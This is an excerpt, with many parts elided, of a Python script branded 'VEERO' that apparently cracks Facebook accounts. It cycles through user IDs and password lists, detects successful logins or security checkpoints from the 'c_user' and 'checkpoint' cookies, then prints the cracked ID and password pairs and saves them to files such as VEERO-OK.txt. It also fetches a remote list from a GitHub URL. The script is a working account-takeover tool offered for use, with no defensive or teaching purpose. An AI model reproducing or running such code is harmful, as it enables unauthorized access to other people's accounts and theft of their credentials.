...
try:
	prox= requests.get('https://raw.githubusercontent.com/Tveero0/ZR/main/Veer.txt').text
...
def menu():			
			...
			linex()
			veero=input(' Choose an option: ')
			if veero in ['1','01']:
				os.system('clear')
				print(logo)
				
				linex()
				print(' Example : /sdcard/VEERO.txt')
				linex()
				...
				os.system('xdg-open https://www.facebook.com/VeerOo.MaLanG.Official?mibextid=ZbWKwL');menu()
			elif veero in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mVEERO\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[VEERO-OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[VEERO-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[VEERO-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/VEERO-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[VEERO-OK]'+cid+' | '+ps+'\033[1;32m')
				open('VEERO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[VEERO-CP] '+cid+' | '+ps+'\33[0;97m')
				open('VEERO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
